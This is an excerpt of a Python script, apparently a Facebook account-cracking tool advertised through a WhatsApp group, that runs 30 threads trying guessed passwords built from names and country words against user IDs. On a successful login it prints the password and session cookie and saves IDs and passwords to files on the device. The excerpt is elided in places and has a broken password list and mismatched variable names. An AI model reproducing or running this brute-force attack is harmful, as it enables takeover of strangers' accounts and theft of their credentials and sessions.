...
# WHATSAPP GROUP : ZAIN PAID COMMAND
# FB ID :  @ZAIN VAI
...
def Main():
        ...
        if  CRACK in ["1","01"]:
            sexy()
        if ZAIN in ["2","02"]:
        	os.system('xdg-open https://wa.me/+923066264859')
        if ZAIN in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Pakistan' ' india]
            asha.submit(alh4aj,uid,pwx,tl)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😈] OK ZAIN-SARKAR-OK.txt')
    print(' [😈] CP ZAIN-SARKAR-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[DNC-ZAIN-SARKAR]\033[1;36m😈[%s/%s]🥴\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # =[ UA = PRO ]= #
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mZAIN-CRACK-OK 😈\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😈] COOKIE :\033[1;95m {coki}")
                open('/sdcard/ZAIN-SARKAR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mZAIN-SARKAR-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/ZAIN-SARKAR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
